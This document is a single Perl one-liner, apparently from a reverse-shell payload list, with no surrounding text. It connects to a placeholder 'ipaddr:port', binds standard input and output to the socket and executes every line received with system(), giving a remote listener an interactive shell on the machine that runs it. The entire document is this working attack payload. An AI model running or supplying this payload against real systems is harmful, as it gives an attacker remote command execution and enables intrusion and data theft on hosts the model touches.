$c=new IO::Socket::INET(PeerAddr,"ipaddr:port");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;
